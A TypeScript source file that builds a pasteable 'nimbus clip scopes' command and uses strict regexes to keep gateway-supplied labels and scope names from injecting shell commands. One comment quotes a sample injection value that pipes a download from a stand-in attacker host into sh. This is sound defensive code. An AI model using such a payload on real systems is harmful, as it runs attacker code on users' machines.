import type { ScopeGap } from "./types.ts";

/**
 * A device label we are willing to put into a command the user will paste into a
 * shell. Deliberately strict.
 *
 * The label is GATEWAY-SUPPLIED — it comes back from `pair/confirm` — and the
 * gateway does not constrain it (`pairingWindow.open(label: string, …)` takes any
 * string). Quoting is not a defence: in POSIX shells `$(...)` and backticks
 * execute inside double quotes, and there is no escaping that is correct across
 * bash, pwsh and cmd at once. So anything that is not a plain identifier gets no
 * command rendered at all.
 */
const SAFE_LABEL = /^[A-Za-z0-9._-]{1,64}$/;

/**
 * A scope name we are willing to put into the same pasteable command.
 *
 * `required` and `granted` are ALSO gateway-supplied — they come straight off the
 * 403 body — and the upstream guards (`parseScopeGap` in gateway-client.ts,
 * `isScopeGap` in messages.ts) only check `typeof === "string"`; they do not look
 * at the characters. Without this check, a 403 body of
 * `{"granted":["clip; curl evil.test|sh"]}` would sail through the label check and
 * land verbatim in the `--set` list. A shape regex, not an allowlist of today's
 * five scope names: an allowlist would silently degrade to generic guidance the
 * moment upstream adds a legitimate new scope.
 */
const SAFE_SCOPE = /^[A-Za-z][A-Za-z0-9_-]{0,31}$/;

/**
 * The exact command that grants a paired device a scope it lacks.
 *
 * Built, never templated. Two reasons, both learned the hard way:
 *
 * 1. `nimbus clip scopes <label> --set <a,b>` REPLACES the scope set — it does not
 *    append (packages/cli/src/commands/clip.ts: runClipScopes passes the parsed
 *    array straight through). So a message reading `--set ...,fetch` is not valid
 *    guidance, and a hardcoded set would silently strip a scope the token already
 *    had. The command must name every scope the token should end up with.
 * 2. A literal `<label>` does not paste. The gateway's 403 carries `granted`, and
 *    the pairing label is stored client-side, so the real values are available.
 *
 * Returns null when the label OR any scope name cannot be safely embedded (see
 * `SAFE_LABEL` / `SAFE_SCOPE`). The caller then renders generic guidance ("run
 * `nimbus clip status` to find your device") rather than a command — refusing to
 * print one is strictly better than printing one that could carry an injection
 * into the user's own shell.
 */
export function scopeCommand(gap: ScopeGap): string | null {
  if (!SAFE_LABEL.test(gap.label) || !SAFE_SCOPE.test(gap.required)) {
    return null;
  }
  for (const scope of gap.granted) {
    if (!SAFE_SCOPE.test(scope)) {
      return null;
    }
  }
  const scopes = gap.granted.includes(gap.required)
    ? [...gap.granted]
    : [...gap.granted, gap.required];
  return `nimbus clip scopes ${gap.label} --set ${scopes.join(",")}`;
}
